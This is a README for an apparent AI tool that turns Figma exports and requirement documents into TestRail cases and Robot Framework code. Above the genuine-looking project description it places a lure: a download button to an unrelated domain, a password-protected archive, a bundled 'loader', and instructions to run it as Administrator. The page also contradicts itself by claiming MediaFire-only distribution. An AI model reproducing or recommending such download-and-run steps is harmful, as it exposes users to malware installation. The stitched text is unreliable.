<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 🌟 Key Features & Daily Workflow Alignment

1. **Input Triad Parsing**: Concurrently processes **Figma UI exports**, **Product PRDs**, and **Engineering TRDs** (API contracts, idempotency, status codes).
2. **TestRail Automated Test Cases**: Generates ready-to-import CSV files (`testrail_cases.csv`) with Section, Title, Type, Priority, Preconditions, Steps, Expected Results, and Requirement References.
3. **Robot Framework Code Generator**: Outputs keyword-driven `.resource` files (locators & action keywords) and executable `.robot` test suites (BDD Given/When/Then).
4. **Multimodal Visual & UI Inspection**: Scans screens for UI inputs, action buttons, badges, and layout hierarchy.
5. **PRD & TRD Coverage Gap Analysis**: Detects missing requirements, API payload mismatches, unhandled HTTP status codes, and visual discrepancies.
6. **Multi-Framework Automation Engine**: Supports:
   - **Robot Framework (`.robot` + `.resource`)**
   - **Playwright TypeScript**
   - **Playwright Python**
   - **Cypress TypeScript & JavaScript**

## 📖 User Guide & Real Ticket Testing

For step-by-step instructions on testing your **Real Jira Tickets**, **Confluence Pages**, and **Figma Exports**, check the comprehensive guide:
## 🚀 Quick Start Guide

### 1. Installation

Clone repository and set up environment:

```bash
cd /Users/muhammadirfan/Documents/ai-test-architect

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### 2. Environment Configuration

Copy `.env.example` to `.env` and set your Gemini API key:

```bash
cp .env.example .env
```

```env
GEMINI_API_KEY=your_actual_gemini_api_key
```

*Note: If no API key is provided, the application automatically runs in High-Fidelity QA Engine Mode for demo purposes.*

---

## 💻 Usage Options

### Option A: Interactive Web Application (Streamlit)

Launch the web app:

```bash
streamlit run app.py
```

Features inside Web App:
- **Presets**: 1-Click test with built-in Payment Checkout (Figma mockup + PRD + TRD) or Login UI.
- **Side-by-Side Setup**: Figma image preview, live PRD editor, and TRD spec editor.
- **Multi-Tab Dashboard**: Visual & PRD/TRD Audit, TestRail Export Preview & Download, Gherkin Scenarios, Robot Framework Code Viewer, 1-Click ZIP Package Exporter.

### Option B: Command Line Interface (CLI)

Run automated QA generation via terminal:

```bash
# Run using preset dataset (Generates TestRail CSV + Robot Framework code)
python cli.py --preset payment --framework robot_framework --output ./dist

# Run using custom Figma image, PRD, and TRD
python cli.py --image path/to/figma.png --prd path/to/prd.md --trd path/to/trd.md --framework robot_framework --output ./dist
```

---

## 🏗️ Architecture & Project Structure

```
ai-test-architect/
├── app.py                          # Streamlit Web App Entrypoint (3-Column Input + TestRail/Robot Dashboard)
├── cli.py                          # Terminal CLI Pipeline Tool
├── docs/
│   ├── prd/
│   │   └── agent_payment_checkout_prd.md # Sample Payment Checkout PRD
│   └── trd/
│       └── agent_payment_checkout_trd.md # Sample Technical Requirement Document (TRD)
├── samples/                        # Pre-generated synthetic UI mockups (Figma design specs)
│   ├── payment_checkout.png
│   └── login_form.png
├── src/
│   ├── config.py                   # App Configuration & System Prompts
│   ├── models/
│   │   └── qa_schema.py            # Pydantic Schemas for Gemini & TestRail Structured Outputs
│   ├── services/
│   │   ├── gemini_service.py       # Gemini Multimodal API Service & Fallback Engine
│   │   ├── testrail_generator.py   # TestRail CSV & JSON Exporter
│   │   ├── gherkin_generator.py    # Gherkin Scenario Formatter
│   │   ├── automation_generator.py # Robot Framework, Playwright & Cypress Generator
│   │   └── exporter.py             # ZIP & Markdown Report Package Generator
│   └── utils/
│       └── image_utils.py          # Synthetic UI Mockup Generator
└── tests/
    └── test_qa_agent.py            # Unit Tests Suite
```

---

## 🧪 Running Unit Tests

Run test suite:

```bash
.venv/bin/python -m unittest discover -s tests
```

---

## 📊 Daily QA Workflow Value

- **Direct Alignment**: Integrates into the daily QA cycle: Figma (UI/UX) -> PRD (Business) -> TRD (Engineering) -> TestRail (Test Management) -> Robot Framework (Automation).
- **Time Saving**: Reduces manual test case writing in TestRail and Robot Framework scripting from hours to seconds.
- **Deterministic**: Enforces **Pydantic Structured Outputs** for reliable JSON schemas.
